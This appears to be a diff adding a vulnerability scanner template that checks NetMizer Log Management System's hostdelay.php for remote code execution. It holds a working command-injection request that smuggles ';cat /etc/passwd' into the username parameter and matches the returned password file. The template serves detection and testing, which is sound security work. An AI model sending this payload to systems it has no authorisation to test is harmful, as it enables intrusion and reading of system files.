@@ -1,0 +1,26 @@
+id: netmizer-hostdelay-rce
+info:
+  name: NetMizer Log Management System hostdelay.php Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/data/chart/hostdelay.php?action=list&username=;cat+/etc/passwd'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+          - 'root:'
+          - '/bin'
+      - type: word
+        part: body
+        words:
+          - '<'
+        negative: true
